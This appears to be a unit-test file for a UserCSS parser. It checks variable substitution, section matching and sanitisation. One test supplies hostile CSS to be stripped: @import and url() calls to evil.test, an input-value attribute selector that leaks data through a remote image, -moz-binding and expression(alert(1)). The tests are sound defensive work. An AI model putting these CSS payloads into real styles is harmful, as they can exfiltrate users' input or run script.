import {
    parseMeta,
    parseRules,
    prepareStyle,
    resolveVars,
    sectionMatches,
    siteRules,
    splitSections,
} from '../../../src/utils/usercss';

const HEADER = `/* ==UserStyle==
@name           Example Dark
@namespace      example.org
@version        1.2.3
@license        MIT
@preprocessor   uso
@var color      bg      "Background"  #101010
@var text       radius  'Radius'      "4px"
@var checkbox   hideAds "Hide ads"    1
@var select     accent  "Accent"      ["blue:Blue", "red:Red*"]
@var select     font    "Font"        {"Sans": "sans-serif", "Mono*": "monospace"}
@var range      width   "Width"       [80, 50, 100, 1, "%"]
@advanced dropdown logo "Logo" {
  none "None" <<<EOT display: none; EOT;
  keep "Keep*" <<<EOT opacity: 0.5; EOT;
}
==/UserStyle== */`;

describe('UserCSS header', () => {
    it('reads the metadata and every variable default', () => {
        const {meta, body} = parseMeta(`${HEADER}\nbody { color: red }`);
        expect(meta).toMatchObject({name: 'Example Dark', version: '1.2.3', license: 'MIT', preprocessor: 'uso'});
        const values = Object.fromEntries(meta.vars.map((v) => [v.name, v.value]));
        expect(values).toEqual({
            bg: '#101010',
            radius: '4px',
            hideAds: '1',
            accent: 'red',
            font: 'monospace',
            width: '80%',
            logo: 'opacity: 0.5;',
        });
        expect(meta.vars.find((v) => v.name === 'bg')!.label).toBe('Background');
        expect(body.trim()).toBe('body { color: red }');
    });

    it('defaults: no header → plain css, preprocessor "default"', () => {
        expect(parseMeta('a{color:red}').meta.preprocessor).toBe('default');
    });
});

describe('variables', () => {
    it('uso: /*[[name]]*/ placeholders are substituted', () => {
        const {meta, body} = parseMeta(`${HEADER}\nbody { background: /*[[bg]]*/; font-family: /*[[font]]*/ }`);
        expect(resolveVars(body, meta)!.trim()).toBe('body { background: #101010; font-family: monospace }');
    });

    it('default: variables become custom properties on :root', () => {
        const src = HEADER.replace('@preprocessor   uso', '@preprocessor   default');
        const {meta, body} = parseMeta(`${src}\nbody { background: var(--bg) }`);
        expect(resolveVars(body, meta)).toContain('--bg: #101010;');
    });

    it('less gets its variables declared; stylus is not supported', () => {
        const less = prepareStyle(`${HEADER.replace('uso', 'less')}\nbody { background: @bg }`);
        expect(less.needs).toBe('less');
        expect(less.code).toContain('@bg: #101010;');
        const stylus = prepareStyle(HEADER.replace('uso', 'stylus'));
        expect(stylus).toMatchObject({code: null, unsupported: 'stylus'});
    });
});

describe('sections', () => {
    const css = `
        :root { --global: 1 }
        @-moz-document domain("example.com"), url-prefix("https://docs.example.org/") {
            .a { color: red }
        }
        @-moz-document regexp("https?://(www\\\\.)?other\\\\.net/.*") {
            .b { color: blue }
        }
        @-moz-document url("https://exact.example.org/page") { .c { color: green } }
    `;
    const sections = splitSections(css);

    it('splits @-moz-document blocks and keeps global code', () => {
        expect(sections).toHaveLength(4);
        expect(sections[0].matchers).toEqual([]);
        expect(sections[1].matchers).toEqual([
            {kind: 'domain', value: 'example.com'},
            {kind: 'url-prefix', value: 'https://docs.example.org/'},
        ]);
        expect(sections[2].matchers[0]).toEqual({kind: 'regexp', value: 'https?://(www\\.)?other\\.net/.*'});
    });

    it('matches domains (incl. subdomains), prefixes, exact URLs and full-match regexps', () => {
        const [global, byDomain, byRegexp, byURL] = sections;
        expect(sectionMatches(global, 'https://anything.test/')).toBe(true);
        expect(sectionMatches(byDomain, 'https://www.example.com/x')).toBe(true);
        expect(sectionMatches(byDomain, 'https://notexample.com/')).toBe(false);
        expect(sectionMatches(byDomain, 'https://docs.example.org/guide')).toBe(true);
        expect(sectionMatches(byRegexp, 'https://www.other.net/a')).toBe(true);
        expect(sectionMatches(byRegexp, 'https://www.other.net.evil.com/a')).toBe(false);
        expect(sectionMatches(byURL, 'https://exact.example.org/page')).toBe(true);
        expect(sectionMatches(byURL, 'https://exact.example.org/page2')).toBe(false);
    });
});

describe('rules', () => {
    it('splits selectors at top level only and flattens @media with its condition', () => {
        const {rules} = parseRules(`
            /* a { comment with braces } */
            a:is(.x, .y), b[data-x="{,}"] { color: red !important; background: url("data:image/png;base64,AA==") }
            @media (max-width: 600px) { .m { display: none } }
            @font-face { font-family: X; src: local(X) }
            @keyframes spin { from { opacity: 0 } to { opacity: 1 } }
        `);
        expect(rules).toHaveLength(2);
        expect(rules[0].selectors).toEqual(['a:is(.x, .y)', 'b[data-x="{,}"]']);
        expect(rules[0].declarations).toEqual([
            {property: 'color', value: 'red', important: true},
            {property: 'background', value: 'url("data:image/png;base64,AA==")', important: false},
        ]);
        expect(rules[1]).toMatchObject({selectors: ['.m'], conditions: ['@media (max-width: 600px)']});
    });

    it('sanitizes untrusted CSS: remote url(), @import, -moz-binding, expression()', () => {
        const {rules, dropped} = parseRules(`
            @import url("https://evil.test/x.css");
            input[value^="a"] { background-image: url(https://evil.test/a) }
            .y { -moz-binding: url(x.xml#b); width: expression(alert(1)); color: #eee; background: //evil.test/z }
            .z { background: image-set("https://evil.test/i.png" 1x) }
        `);
        expect(rules.map((r) => r.selectors[0])).toEqual(['.y']);
        expect(rules[0].declarations.map((d) => d.property)).toEqual(['color', 'background']);
        expect(dropped).toBe(5);
    });

    it('keeps custom properties verbatim (themes recolor sites through them)', () => {
        const {rules} = parseRules(':root { --Color-Canvas: #0d1117; --x:  1px }');
        expect(rules[0].declarations[0]).toEqual({property: '--Color-Canvas', value: '#0d1117', important: false});
    });
});

describe('siteRules', () => {
    it('returns only the sanitized rules that apply to the URL', () => {
        const source = `${HEADER}
            @-moz-document domain("example.com") { .page { background: /*[[bg]]*/ !important } }
            @-moz-document domain("other.net") { .other { color: red } }`;
        const result = siteRules(source, 'https://example.com/');
        expect(result.unsupported).toBe('');
        expect(result.rules).toEqual([
            {selectors: ['.page'], declarations: [{property: 'background', value: '#101010', important: true}], conditions: []},
        ]);
    });
});
